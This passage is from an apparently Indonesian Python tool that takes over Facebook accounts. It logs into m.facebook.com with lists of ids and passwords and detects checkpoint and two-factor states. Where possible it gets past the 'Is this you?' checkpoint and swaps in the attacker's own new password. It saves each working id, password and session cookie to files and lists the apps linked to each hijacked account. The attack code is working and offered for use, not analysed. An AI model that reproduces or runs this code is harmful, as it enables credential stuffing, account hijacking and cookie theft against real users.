		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def mengecek(idf,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (idf,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰─%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,idf,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,idf,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,idf,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,idf,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		
########ApK#######
def cek_apk(kuki):
	active = Tree("[b red]Aplikasi Terkait[b white]")
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			
			active.add("\%s \33[0m %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\    %s\33[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			nonactive = Tree(f"[b red]Aplikasi Tak Terkait[b white]")
			nonactive.add("\%s \33[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\    %s \33[0mcookie invalid"%(M))
		cetak(active,nonactive)
#----------------------[ CEK-APLIKASI ]---------------------#
def get_active(actie,cookie):
	ses = requests.Session()
	try:
		data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
		game = [i.text for i in data.find_all("h3")]
		if len(game)==0:
			active.add(f"{P}tidak ada aplikasi yang terkait")
		else:
			for i in range(len(game)):
				active.add(f"{H}{str(game[i]).replace('Ditambahkan',' Ditambahkan')}")
			else:pass
		next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass


#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

